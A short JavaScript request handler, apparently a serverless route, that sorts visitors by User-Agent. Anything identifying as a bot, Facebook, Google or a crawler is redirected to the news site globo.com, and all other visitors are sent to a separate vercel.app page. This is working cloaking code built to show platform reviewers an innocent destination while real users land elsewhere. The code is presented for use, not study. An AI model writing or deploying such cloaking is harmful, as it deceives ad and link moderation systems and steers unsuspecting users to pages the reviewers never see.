export default function handler(req, res) {
  const ua = req.headers['user-agent']?.toLowerCase() || '';

  if (
    ua.includes('bot') ||
    ua.includes('facebook') ||
    ua.includes('google') ||
    ua.includes('crawler')
  ) {
    res.writeHead(302, { Location: 'https://www.globo.com' });
    res.end();
  } else {
    res.writeHead(302, { Location: 'https://potencia-vercel.vercel.app' });
    res.end();
  }
}
